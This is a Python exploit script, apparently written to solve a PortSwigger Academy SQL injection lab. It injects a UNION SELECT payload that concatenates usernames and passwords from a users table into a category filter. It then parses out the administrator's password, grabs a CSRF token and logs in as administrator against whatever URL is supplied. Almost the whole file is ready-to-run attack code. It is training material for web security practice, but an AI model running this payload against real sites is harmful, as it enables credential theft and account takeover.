#!/usr/bin/python3

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> SQL injection UNION attack, retrieving multiple values in a single column')
        print('    >> by Port Swigger Academy\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category=Gifts'
    sqli_payload = "' UNION SELECT NULL, username || ':' || password FROM users--"
    r = requests.get(url+path+sqli_payload,verify=False,proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    admin_password = soup.find(text=re.compile('.*administrator.*')).split(":")[1]
    return admin_password

def get_csrf_token(s, url):
    path = "/login"
    response = s.get(url+path, verify=False, proxies=proxies)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def login_as_an_administrator(s, url, admin_password):
    csrf = get_csrf_token(s, url)
    path = "/login"
    data = {"csrf": csrf, "username": "administrator", "password": admin_password}
    response = s.post(url+path, data=data, verify=False, proxies=proxies)
    if "Log out" in response.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        output.info("Usage: %s <url>" % sys.argv[0])
        output.info("Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    output.info("Dumping the list of usernames and passwords...")
    admin_password = exploit_sqli_users_table(url)
    if admin_password:
        output.success("The administrator password is '%s'" % admin_password)
        output.info("Try to login as an administrator")
        s = requests.Session()
        if login_as_an_administrator(s, url, admin_password):
            output.success("We have logged as an Administrator!")
        else:
            output.error("Did not login as an Administrator")
    else:
        output.error("Did not find an administrator password.")
